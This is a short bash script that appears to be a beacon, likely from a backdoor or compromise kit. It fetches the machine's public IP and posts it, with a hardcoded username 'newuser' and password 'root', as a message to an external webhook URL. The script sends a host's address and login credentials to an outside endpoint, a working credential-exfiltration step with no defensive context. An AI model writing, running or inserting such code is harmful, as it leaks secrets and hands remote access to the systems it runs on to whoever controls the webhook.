# send_webhook.sh
#!/bin/bash

IP=$(curl -s ifconfig.me)
USERNAME="newuser"
PASSWORD="root"

PAYLOAD=$(jq -n --arg ip "$IP" --arg user "$USERNAME" --arg pass "$PASSWORD" \
  '{"content": "IP: \($ip)\nUser: \($user)\nPassword: \($pass)"}')

curl -H "Content-Type: application/json" -d "$PAYLOAD" $WEBHOOK_URL
